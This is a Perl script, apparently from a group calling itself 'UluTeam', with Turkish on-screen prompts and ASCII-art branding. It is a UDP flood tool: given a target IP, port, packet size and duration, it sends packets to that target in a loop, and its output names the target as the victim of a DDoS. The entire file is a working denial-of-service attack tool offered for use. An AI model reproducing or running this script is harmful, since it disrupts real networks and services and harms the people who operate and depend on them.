#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD YELLOW "Ip adresi\n";
print BOLD RED "Port kodu\n";
print BOLD BLUE "Byte\n";
print BOLD GREEN  "Zaman\n";
print BOLD RED "UluTeam1 Kullanilacak\n";

##
# UluTeam1
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Ip adresi tespit edilemedi$ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD GREEN<<EOTEXT;

??         ??  ??          ??         ??  ???????????  ??????????
??         ??  ??          ??         ??      ??       ??        
??         ??  ??          ??         ??      ??       ??        
??         ??  ??          ??         ??      ??       ??????????
??         ??  ??          ??         ??      ??       ??         
??         ??  ??          ??         ??      ??       ??        
?????????????  ??????????  ?????????????      ??       ??????????

       ?????????           ????          ????
     ??          ??        ??  ??      ??  ??
   ??              ??      ??    ??  ??    ??
   ??              ??      ??      ??      ??
   ??????????????????      ??              ??
   ??              ??      ??              ??
   ??              ??      ??              ??

 ULU
 TEAM
EOTEXT

print "Ddosa maruz kalan: $ip " . ($port ? $port : "random") . "
Atilan byte sayisi: " .
  ($size ? "$size kadar" : "Error..") . "
  ~Karmasaseven gmail.com~ " .
  ($time ? " Saldiri suresi $time saniye" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}